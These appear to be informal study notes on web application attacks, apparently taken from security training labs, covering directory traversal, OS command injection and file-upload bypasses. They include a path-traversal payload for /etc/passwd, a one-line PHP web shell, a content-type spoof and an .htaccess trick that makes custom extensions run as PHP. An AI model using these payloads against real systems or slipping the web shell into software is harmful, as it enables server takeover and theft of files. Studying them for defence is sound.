Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.
The Information Schema COLUMNS table provides information about columns in each table on the server.

### directory traversal
```
url encoding
double url encoding
....// so after one strip we get ../
if check happens whether it starts with given dir then use that dir then traverse back
if chekc happens whether file ends with given extension use null byte

a null byte to effectively terminate the file path before the required extension. For example:

filename=../../../etc/passwd%00.png
var/www/img
```
### os command injection

Purpose of command	Linux	Windows
Name of current user	whoami	whoami
Operating system	uname -a	ver
Network configuration	ifconfig	ipconfig /all
Network connections	netstat -an	netstat -an
Running processes	ps -ef	tasklist

->

This payload uses the nslookup command to cause a DNS lookup for the specified domain. The attacker can monitor to see if the lookup happens, to confirm if the command was successfully injected

Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using " or ') before using suitable shell metacharacters to inject a new command.

```
#### File Redirection Metacharacters
```
For a better understanding of redirection in Bash, each process in Linux has file descriptors, known as standard input (stdin/0), standard output (stdout/1), and standard error (stderr/2). They determine the origin of the command input and decide where to send the output and error message
```
#### brace expansion meta char
```
touch {apple,cider,vinegar}.{fruit,liquid,sour}
touch {a,b,c}.{1,2,3}={a..c}.{1..3}

```
#### other
```
pipe:Connects command output as an input to the other command.:cat /etc/passwd | grep root
semi colon:Allows execution of sequential commands, one after the other.::cd /etc ; ls -la ; chmod +x /tmp/script.php
ampresand:Runs the processes or commands in the background.::find / -perm -u=s -type f &
circumflex ^:Matches any pattern that begins with the expression followed by ^::

mime type type/subtype
https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types

MIME sniffing
In the absence of a MIME type, or in certain cases where browsers believe they are incorrect, browsers may perform MIME sniffing â€” guessing the correct MIME type by looking at the bytes of the resource.

Servers can prevent MIME sniffing by sending the X-Content-Type-Options heade

<?php echo file_get_contents('/home/carlos/secret'); ?>in php.php

<?php echo system($_GET['command']); ?>
This script takes a command as a parameter from the URL query string using $_GET['command'] and then executes it using the system function. The system function in PHP is used to execute an external command and display the output.

```
he message body is split into separate parts for each of the form's inputs. Each part contains a Content-Disposition header, which provides some basic information about the input field it relates to. These individual parts may also contain their own Content-Type header, which tells the server the MIME type of the data that was submitted using this input.
->>>>>>>> Content-Type header matches an expected MIME type.
```
### web shell uplad via content type restriction bypass
```
application/x-php==>image/png
```
```
servers generally only run scripts whose MIME type they have been explicitly configured to execute. Otherwise, they may just return some kind of error message or, in some cases, serve the contents of the file as plain text instead:

GET /static/exploit.php?command=id HTTP/1.1
Host: normal-website.com


HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 39

<?php echo system($_GET['command']); ?>


his kind of configuration often differs between directories. A directory to which user-supplied files are uploaded will likely have much stricter controls than other locations on the filesystem that are assumed to be out of reach for end users. If you can find a way to upload a script to a different directory that's not supposed to contain user-supplied files, the server may execute your script after all.

### Insufficient blacklisting of dangerous file types

### Overriding the server configuration
```
web shell upload via file extension blacklist bpass
before an Apache server will execute PHP files requested by a client, developers might have to add the following directives to their /etc/apache2/apache2.conf file:

LoadModule php_module /usr/lib/apache2/modules/libphp.so
AddType application/x-httpd-php .php

 Apache servers, for example, will load a directory-specific configuration from a file called .htaccess if one is present.

similarly, developers can make directory-specific configuration on IIS servers using a web.config file.
AddType application/x-httpd-php .l33t
treet/process files with extension .133t as php
```

Many servers also allow developers to create special configuration files within individual directories in order to override or add to one or more of the global settings. Apache servers, for example, will load a directory-specific configuration from a file called .htaccess if one is presen
